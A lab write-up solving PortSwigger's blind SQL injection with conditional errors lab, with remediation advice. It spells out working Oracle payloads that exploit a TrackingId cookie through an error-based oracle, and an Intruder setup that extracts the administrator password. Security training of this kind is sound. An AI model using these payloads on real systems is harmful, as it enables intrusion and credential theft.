# Lab Report: Blind SQL Injection With Conditional Errors

**Target:** PortSwigger Web Security Academy
**Lab:** [Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
**Category:** SQL Injection → Blind SQL Injection
**Difficulty:** Practitioner
**Status:** Solved

---

## Summary

The application sets a `TrackingId` cookie for analytics purposes and uses its
value directly, unsanitized, inside a SQL query executed against an Oracle
database. The application never reflects query output and behaves identically
regardless of whether the query returns rows — but if the injected SQL causes
a **runtime error** (as opposed to succeeding silently), the server returns a
distinct `500 Internal Server Error` response instead of the normal page.
This error/no-error behavioral difference was used as a blind boolean oracle
to enumerate database contents, ultimately recovering the `administrator`
user's plaintext password and achieving full account takeover.

## Vulnerability Classification

- **Type:** Blind SQL Injection (Error-Based / Conditional Errors)
- **OWASP:** A03:2021 – Injection
- **CWE:** CWE-89 (SQL Injection)
- **Database:** Oracle

## Injection Point

```
Cookie: TrackingId=<value>
```

Sent on every request to the application's home page (`GET /`), and used
server-side in a SQL query without parameterization or escaping.

## Methodology

### 1. Confirm the injection point

Appending a single quote to the cookie value broke query syntax and
triggered a `500 Internal Server Error`:

```
Cookie: TrackingId=Htnp7JTTJsahOeVl'
```

This confirmed the value is concatenated directly into a SQL statement.

### 2. Establish a true/false oracle

Using Oracle's `CASE WHEN ... THEN ... ELSE ... END` combined with a
divide-by-zero (`TO_CHAR(1/0)`) to deliberately force a runtime error when a
condition is true:

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) || '
```

- `(1=1)` → **500 error** (condition true)
- `(1=2)` → **200 OK**, normal page (condition false)

This confirmed a reliable error/no-error oracle for arbitrary boolean
conditions.

### 3. Confirm the administrator account exists

```sql
' || (SELECT CASE WHEN (SELECT COUNT(*) FROM users WHERE username='administrator')=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual) || '
```

Returned `500`, confirming the account exists and the subquery pattern
executes correctly.

### 4. Determine password length via binary search

Using `LENGTH(password)` with increasing/narrowing thresholds:

| Test | Result |
|---|---|
| `>10` | 500 (true) |
| `>15` | 500 (true) |
| `>20` | 200 (false) |
| `>17` | 500 (true) |
| `>18` | 500 (true) |
| `>19` | 500 (true) |

Password length determined to be exactly **20 characters** in 6 requests via
binary search, rather than testing every length sequentially.

### 5. Extract the password character-by-character

Using Oracle's `SUBSTR(password, position, 1)`, each of the 20 character
positions was tested against the full alphanumeric character set
(`a-z`, `A-Z`, `0-9`) via a single **Burp Suite Intruder Cluster bomb attack**:

```sql
' || (SELECT CASE WHEN (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a' THEN TO_CHAR(1/0) ELSE NULL END FROM dual) || '
```

- Payload set 1 (position): Numbers, 1–20
- Payload set 2 (character): Simple list, 62 alphanumeric characters
- Total requests: 1,240 (20 × 62)
- Result: exactly one `500` response per position, each identifying the
  correct character at that position

**Recovered password:** `vmbar47swae0mja097kr`

### 6. Authenticate and confirm takeover

Logged in as:
- **Username:** `administrator`
- **Password:** `vmbar47swae0mja097kr`

Loaded `My account`, confirming:
- `Your username is: administrator`
- Lab status banner: **"Congratulations, you solved the lab!"**

## Root Cause

User-supplied cookie data (`TrackingId`) is concatenated directly into a SQL
query without parameterization, sanitization, or escaping. Although the
application suppresses query output and returns a uniform response for
successful queries, it fails to suppress the distinction between a query that
executes successfully and one that throws a runtime error — creating a
reliable, if slow, side channel for extracting arbitrary data from the
database one boolean condition at a time.

## Impact

- Full compromise of the `administrator` account, including password
  disclosure in plaintext.
- The same technique generalizes to extracting **any** data in **any**
  accessible table (other users' credentials, session data, etc.), not just
  the single password targeted here.
- No authentication or prior access was required — the injection point is
  reachable by any anonymous visitor via a cookie set on the home page.
- Severity: **Critical** — unauthenticated, remote, complete database
  compromise via blind extraction.

## Remediation

1. **Use parameterized queries / prepared statements** for all database
   access; never concatenate user-controllable input (including cookies,
   headers, and other "non-obvious" input sources) into SQL strings.
2. **Apply the principle of least privilege** to the database account used
   by the application, limiting it to only the tables/columns it needs.
3. **Suppress verbose error messages** in production; a generic error page
   should be shown to the user regardless of the underlying failure reason,
   removing even the error/no-error side channel exploited here.
4. **Validate and encode all input**, including cookie values, as a
   defense-in-depth measure, even where parameterized queries are the
   primary fix.
5. **Monitor and rate-limit** unusual patterns of requests differing only in
   cookie values, which can indicate automated blind-injection extraction
   attempts.

## Timeline

- Lab accessed: `2026-11-18`
- Injection point confirmed and oracle established: `2026-11-18`
- Password length determined (20 characters): `2026-11-18`
- Full password extracted via Intruder Cluster bomb attack: `2026-11-18`
- Lab confirmed solved (administrator account takeover): `2026-11-18`

## References

- [PortSwigger: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [PortSwigger: SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
